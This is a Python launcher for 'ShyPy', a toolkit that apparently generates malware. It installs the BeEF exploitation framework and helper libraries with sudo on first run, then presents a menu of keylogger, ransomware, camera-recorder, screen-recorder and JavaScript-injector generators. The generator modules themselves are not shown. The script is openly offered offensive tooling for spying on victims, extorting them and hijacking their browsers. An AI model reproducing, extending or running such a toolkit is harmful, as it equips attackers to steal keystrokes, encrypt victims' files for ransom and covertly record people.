import platform
import subprocess
import time
import os

if __name__ == '__main__':
    if not os.path.exists("Libraries/installed.txt"):

        if platform.system() == "Windows":
            subprocess.check_call(['pip', 'install', 'pynput', "pyinstaller", "Cryptography", "simplejson", "opencv-python", "pyautogui", "colorama"])
        
        else:
            try:
                subprocess.call(["sudo", "apt-get", "install", "beef-xss"])
                subprocess.check_call(['pip3', 'install', 'pynput', "pyinstaller", "Cryptography", "simplejson", "opencv-python", "pyautogui", "colorama"])
                subprocess.check_call(["pip3", "install", "--upgrade", "pyinstaller"]) 
                subprocess.check_call(["apt-get", "install", "python3-dev", "python3-pip", "python3-setuptools", "python3-wheel", "build-essential"])
                os.environ["LD_LIBRARY_PATH"] = "/usr/local/lib/python3.11/site-packages/PyInstaller/bootloader/Linux-64bit"
                
            except subprocess.CalledProcessError as error:
                print(f"An error occurred: {error}. Please try again with appropriate privileges.")
                
            except Exception as error:
                print(f"An unexpected error occurred: {error}. Please try again.")
    
        with open("Libraries/installed.txt", "w", encoding="utf-8") as file:
            file.write("Library Setups Has Been Completed. Dont Delete!!!")


from colorama import Fore as f

def clear_terminal():
    os_name = platform.system().lower()
    if os_name == "linux" or os_name == "darwin":
        os.system("clear")
    elif os_name == "windows":
        os.system("cls")
    
def Menu():
    try:
        clear_terminal()
        print("""
            ╔════════════════════════╦══════════════════════╦════════════════════════╗
            ║* Version  :    1.1    *║ Welcome To The ShyPy ║*                      *║
            ╠════════════════════════╩═════════╦════════════╩════════════════════════╣
            ║           Module Name            ║          Operating System           ║  
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║[1] Keylogger Generator           : [Windows | Linux]                   ║
            ║[2] Ransomware Generator          : [Windows | Linux]                   ║
            ║[3] Camera Recorder Generator     : [Windows | Linux]                   ║
            ║[4] Screen Recorder Generator     : [Windows | Linux]                   ║   
            ║[5] Js Injector                   : [Linux]                             ║   
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║ "use"                            : Used To Select Modules.             ║
            ║ "exit"                           : To Log Out Of ShyPy.                ║  
            ╠═════════════════════╦════════════╩═══════════════╦═════════════════════╣
            ║*                   *║ Developed by Atahan Poyraz ║*                   *║
            ╚═════════════════════╩════════════════════════════╩═════════════════════╝
    \n""")

        Answer = input("[ShyPy]: ").lower()

        if Answer == "use 1" or Answer == "use keylogger generator":
            from Modules.Keylogger_Generator.Keylogger_Generator import Keylogger_Generator

        elif Answer == "use 2" or Answer == "use ransomware generator":
            from Modules.Ransomware_Generator.Ransomware_Generator import RansomWare_Generator

        elif Answer == "use 3" or Answer == "use camera recorder":
            from Modules.Camera_Recorder.Camera_Recorder import Camera_Recorder
                
        elif Answer == "use 4" or Answer == "user screen recorder":
            from Modules.Screen_Recorder.Screen_Recorder import Screen_Recorder
            
        elif Answer == "use 5" or Answer == "use js injector":
            from Modules.JavaScript_Injector.Js_Injector import Js_Injector
                            
        elif Answer == "exit":
            print(f.RESET)
            clear_terminal()

        else:
            print(f.LIGHTYELLOW_EX + "[!] Invalid Option" + f.LIGHTCYAN_EX)
            time.sleep(0.5)
            Menu()
    except KeyboardInterrupt:
        clear_terminal()
        print("Signed Out Of The Shypy")
        print(f.RESET)

def start():
    try:
        clear_terminal()
        print(f.LIGHTCYAN_EX + """      
████████████████████████████████████████████████████████████████████████████╗
╚══██╔══════════════════════════════════════════════════════════════════════╝
   ██║  ██╗  ██╗  ███████╗     ██████╗  ██╗  ██╗  ██╗  ██╗  ██████═╗ ██╗  ██╗
   ██║  ██╚══██║  ██╔════╝    ██╔════╝  ██╚══██║  ██╚══██║  ██╔══██║ ██╚══██║
   ██║  ███████║  ███████╗    ╚██████═╗ ███████║  ╚██████║  ██████╔╝ ╚██████║
   ██║  ██╔══██║  ██╔════╝     ╚════██║ ██╔══██║   ╚═══██║  ██╔═══╝   ╚══╗██║
   ██║  ██║  ██║  ███████╗    ███████╔╝ ██║  ██║  ██████╔╝  ██║          ║██║
   ╚═╝  ╚═╝  ╚═╝  ╚══════╝    ╚══════╝  ╚═╝  ╚═╝  ╚═════╝   ╚═╝         ╔███║
   ████████████████████████████████████████████████████████████████████████╔╝
   ╚═══════════════════════════════════════════════════════════════════════╝\n\n""")
        Answer = input('[Press "ENTER" To Continue]: ').lower()
        
        if Answer == "":
            Menu()
        else:
            start()
    except KeyboardInterrupt:
        clear_terminal()
        print("Signed Out Of The Shypy")
        print(f.RESET)
        
start()
